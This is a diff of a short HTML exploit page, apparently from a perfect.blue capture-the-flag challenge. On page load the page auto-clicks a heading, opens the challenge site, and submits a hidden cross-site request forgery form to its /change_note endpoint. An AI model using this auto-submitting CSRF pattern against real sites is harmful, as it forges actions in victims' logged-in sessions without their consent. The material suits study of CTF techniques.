@@ -1,28 +1,17 @@
 <script>
     window.onload = function () {
-            let btn = document.getElementById('plsClickme');
-            btn.click()
+        let myBtn = document.getElementById('plsClickme');
+        myBtn.click()
     };
 
     function go() {
-        let w = window.open("https://tbdxss.chal.perfect.blue/", ''); // i dunno what to add here 
+        let w = window.open("https://tbdxss.chal.perfect.blue/");
         setTimeout(function () { w.close(); csrf.submit() }, 1000)
     }
 </script>
 
 <h1 onclick=go() id="plsClickme">Click me</h1>
 
-
-<!--
-https://tbdxss.chal.perfect.blue/do_report
-
-<form action="/change_note" id="noteform" method=POST>
-        <textarea rows="10" cols="100" name="data" form="noteform" placeholder="Note's content"></textarea>
-        <br>
-        <input type="submit" value="submit">
-        </form>
-
--->
 
 <form style="display:none" name=csrf method=post id="noteform" action="https://tbdxss.chal.perfect.blue/change_note">
     <textarea rows="10" cols="100" name="data" form="noteform" placeholder="Note's content" value="test"></textarea>
